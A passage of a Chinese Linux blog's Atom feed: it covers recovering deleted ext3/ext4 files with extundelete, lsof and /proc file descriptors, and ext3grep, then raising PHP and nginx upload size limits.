（必须安装否则，前面./configure报错）</div><div class="line">./configure （成功）</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure>
<h3 id="2-软件安装完毕，下面我们来恢复文件吧"><a href="#2-软件安装完毕，下面我们来恢复文件吧" class="headerlink" title="2.软件安装完毕，下面我们来恢复文件吧"></a>2.软件安装完毕，下面我们来恢复文件吧</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mkdir recover</div><div class="line"><span class="built_in">cd</span> recover</div><div class="line">extundelete  /dev/sda4 --inode  2  （看到你所删除的文件）</div><div class="line">extundelete  /dev/sda4 -restore-inode 15 （按对应的节点来恢复文件）</div><div class="line">extundelete  /dev/sda4 -restore-file  a.txt   （按对应文件名来恢复文件）</div><div class="line">extundelete  /dev/sda4 -restore-dirctory etc  （按对应的目录，这里我以etc目录）</div><div class="line">extundelete  /dev/sda4 -restore-all （全部恢复）</div></pre></td></tr></table></figure>
<hr>
<h2 id="方案2）使用lsof自带一个的神秘功能"><a href="#方案2）使用lsof自带一个的神秘功能" class="headerlink" title="方案2）使用lsof自带一个的神秘功能"></a>方案2）使用lsof自带一个的神秘功能</h2><p>　　原理：大多数与 lsof 相关的信息都存储于以进程的 PID命名的目录中,假如由于误操作将/var/log/messages文件删除掉了，那么这时要将/var/log/messages文件恢复的方法如下：</p>
<p>　　首先使用lsof来查看当前是否有进程打开/var/logmessages文件，如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lsof |grep /var/<span class="built_in">log</span>/messages</div><div class="line"></div><div class="line">syslogd 1283 root 2w REG 3,3 5381017 1773647 /var/<span class="built_in">log</span>/messages (deleted)</div></pre></td></tr></table></figure>
<p>　　从上面的信息可以看到 PID 1283（syslogd）打开文件的文件描述符为 2。同时还可以看到/var/log/messages已经标记被删除了。因此我们可以在 /proc/1283/fd/2 （fd下的每个以数字命名的文件表示进程对应的文件描述符）中查看相应的信息，如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">head -n 10 /proc/1283/fd/2</div><div class="line"></div><div class="line">Aug 4 13:50:15 holmes86 syslogd 1.4.1: restart.</div><div class="line">Aug 4 13:50:15 holmes86 kernel: klogd 1.4.1, <span class="built_in">log</span> <span class="built_in">source</span> = /proc/kmsg started.</div><div class="line">Aug 4 13:50:15 holmes86 kernel: Linux version 2.6.22.1-8 (root@everestbuilder.linux-ren.org)</div><div class="line">(gcc version 4.2.0) <span class="comment">#1 SMP Wed Jul 18 11:18:32 EDT 2007 Aug 4 13:50:15 holmes86 kernel:</span></div><div class="line">BIOS-provided physical RAM map: Aug 4 13:50:15 holmes86 kernel: BIOS<span class="_">-e</span>820:</div><div class="line">0000000000000000 - 000000000009f000 (usable) Aug 4 13:50:15 holmes86 kernel: BIOS<span class="_">-e</span>820:</div><div class="line">000000000009f000 - 00000000000a0000 (reserved) Aug 4 13:50:15 holmes86 kernel:</div><div class="line">BIOS<span class="_">-e</span>820: 0000000000100000 - 000000001f7d3800 (usable) Aug 4 13:50:15 holmes86 kernel:</div><div class="line">BIOS<span class="_">-e</span>820: 000000001f7d3800 - 0000000020000000 (reserved) Aug 4 13:50:15 holmes86</div><div class="line">kernel: BIOS<span class="_">-e</span>820: 00000000e0000000 - 00000000f0007000 (reserved) Aug 4 13:50:15</div><div class="line">holmes86 kernel: BIOS<span class="_">-e</span>820: 00000000f0008000 - 00000000f000c000 (reserved)</div></pre></td></tr></table></figure>
<p>　　从上面的信息可以看出，查看 /proc/8663/fd/15 就可以得到所要恢复的数据。如果可以通过文件描述符查看相应的数据，那么就可以使用 I/O 重定向将其复制到文件中，如:cat /proc/1283/fd/2 &gt; /var/log/messages对于许多应用程序，尤其是日志文件和数据库，这种恢复删除文件的方法非常有用。</p>
<hr>
<h2 id="方案3）使用ext3grep恢复文件（适合rhel5-X系统的ext3"><a href="#方案3）使用ext3grep恢复文件（适合rhel5-X系统的ext3" class="headerlink" title="方案3）使用ext3grep恢复文件（适合rhel5.X系统的ext3)"></a>方案3）使用ext3grep恢复文件（适合rhel5.X系统的ext3)</h2><h3 id="1-编译安装ext3grep-0-10-1"><a href="#1-编译安装ext3grep-0-10-1" class="headerlink" title="1. 编译安装ext3grep-0.10.1"></a>1. 编译安装ext3grep-0.10.1</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tar -jxvf  ext3grep-0.10.1.tar.gz</div><div class="line"><span class="built_in">cd</span> ext3grep-0.10.1</div><div class="line">./configure</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure>
<h3 id="2-软件安装完毕，下面我们来恢复文件吧-1"><a href="#2-软件安装完毕，下面我们来恢复文件吧-1" class="headerlink" title="2. 软件安装完毕，下面我们来恢复文件吧"></a>2. 软件安装完毕，下面我们来恢复文件吧</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir recover</div><div class="line"><span class="built_in">cd</span> recover</div><div class="line">ext3grep /dev/your-device --restore-filepath/to/your/file/filename</div></pre></td></tr></table></figure>
<p>　　需要注意的是，上面的文件路径，是在该分区上文件路径。假设我们要恢复/dev/sda3分区上文件，这个分区原来的安装点是/home，现在想恢复文件/home/easwy/vi/tips.xml，那么输入的命令应该是：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ext3grep /dev/sda3--restore-file easwy/vi/tips.xml</div></pre></td></tr></table></figure>
<p>　　所有恢复的文件都会放在当前目下在<code>RESTORED_FILES</code>目录下，大小也一样，这里<code>RESTORED_FILES</code>目录是执行ext3grep的当前目录下</p>
<p>　　如果你忘记了文件名，或者你误删除的是一个目录而你无法记全该目录中的文件，你可以先用下面的命令查询一下文件名：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ext3grep /dev/sda3 --dump-names | tee filename.txt</div></pre></td></tr></table></figure>
<p>　　上面的命令把ext3grep命令的输出记录到文件filename.txt中，你可以慢慢查看，或者使用grep命令过滤出你需要的信息。</p>
<p>　　当你知道了目录/文件的信息后，就可以用上面说的命令进行恢复了。</p>
<p>　　复所有文件和目录，但是目录的话，如果删除时间较长，不一定能完全恢复，压缩文件一般都能恢复</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ext3grep /termite/cc-disk --restore-all</div><div class="line">ext3grep /dev/sda3  --ls --inode 2 创建扫描分区文件：sda5.ext3grep.stage1和sda5.ext3grep.stage2</div></pre></td></tr></table></figure>
<p>　　如果想要重新生成可以删除这个两个文件，再次执行这条命令。另外当第一次执行ext3grep /dev/sda3 –restore-file test/a.txt进行还原时也会自动生成扫描分区文件。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、首先我们先来了解下文件删除原理：&quot;&gt;&lt;a href=&quot;#一、首先我们先来了解下文件删除原理：&quot; class=&quot;headerlink&quot; title=&quot;一、首先我们先来了解下文件删除原理：&quot;&gt;&lt;/a&gt;一、首先我们先来了解下文件删除原理：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1）linux是通过link的数量来控制文件删除的，只有当一个文件不存在任何link的时候，这个文件才会被删除。一般来说，每个文件都有2个link计数器：i_count和i_nlink。&lt;/li&gt;
&lt;li&gt;2）当进程打开了某个文件时，只要该进程保持打开该文件，即使将其删除，它依然存在于磁盘中。这意味着，进程并不知道文件已经被删除，它仍然可以向打开该文件时提供给它的文件描述符进行读取和写入。除了该进程之外，这个文件是不可见的，因为已经删除了其相应的目录索引节点。&lt;/li&gt;
&lt;li&gt;3）当你发现你误删除了文件后，要做的第一件事是马上卸载被误删除文件所在的分区，或者以只读的方式来挂载该分区。原因大家都很清楚，文件被删除后，文件中的数据还存在磁盘上，除非存放这些数据的数据块又被操作系统分配出去了。我们这一步就是尽量降低数据块中数据被覆盖的风险，以提高恢复数据成功的比率。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="system" scheme="http://www.unix-like.com/categories/system/"/>
    
    
      <category term="数据恢复" scheme="http://www.unix-like.com/tags/%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D/"/>
    
  </entry>
  
  <entry>
    <title>修改PHP上传文件大小限制</title>
    <link href="http://www.unix-like.com/2017/05/30/service/%E4%BF%AE%E6%94%B9PHP%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E9%99%90%E5%88%B6/"/>
    <id>http://www.unix-like.com/2017/05/30/service/修改PHP上传文件大小限制/</id>
    <published>2017-05-30T01:56:54.000Z</published>
    <updated>2017-06-02T01:56:49.133Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-配置php-ini文件-（以上传500M以下大小的文件为例）"><a href="#一-配置php-ini文件-（以上传500M以下大小的文件为例）" class="headerlink" title="一.配置php.ini文件 （以上传500M以下大小的文件为例）"></a>一.配置php.ini文件 （以上传500M以下大小的文件为例）</h1><p>　　查找以下选项并修改:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">file_uploads = On ;打开文件上传选项</div><div class="line">upload_max_filesize = 500M ;上传文件上限</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>　　如果要上传比较大的文件，仅仅以上两条还不够，必须把服务器缓存上限调大，把脚本最大执行时间变长</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">post_max_size = 500M ;post上限</div><div class="line">max_execution_time = 1800 ; Maximum execution time of each script, <span class="keyword">in</span> seconds脚本最大执行时间</div><div class="line">max_input_time = 1800 ; Maximum amount of time each script may spend parsing request data</div><div class="line">memory_limit = 128M ; Maximum amount of memory a script may consume (128MB)内存上限</div></pre></td></tr></table></figure>
<h1 id="二-修改nginx配置"><a href="#二-修改nginx配置" class="headerlink" title="二.修改nginx配置"></a>二.修改nginx配置</h1><p>　　需要在对应的虚拟主机配置中修改　<code>client_max_body_size</code> 参数的值</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">client_max_body_size 500m;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一-配置php-ini文件-（以上传500M以下大小的文件为例）&quot;&gt;&lt;a href=&quot;#一-配置php-ini文件-（以上传500M以下大小的文件为例）&quot; class=&quot;headerlink&quot; title=&quot;一.配置php.ini文件 （以上传500M以下大小的文件为例）&quot;&gt;&lt;/a&gt;一.配置php.ini文件 （以上传500M以下大小的文件为例）&lt;/h1&gt;&lt;p&gt;　　查找以下选项并修改:&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;file_uploads = On ;打开文件上传选项&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;upload_max_filesize = 500M ;上传文件上限&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="php" scheme="http://www.unix-like.com/tags/php/"/>
    
  </entry>
  
</feed>
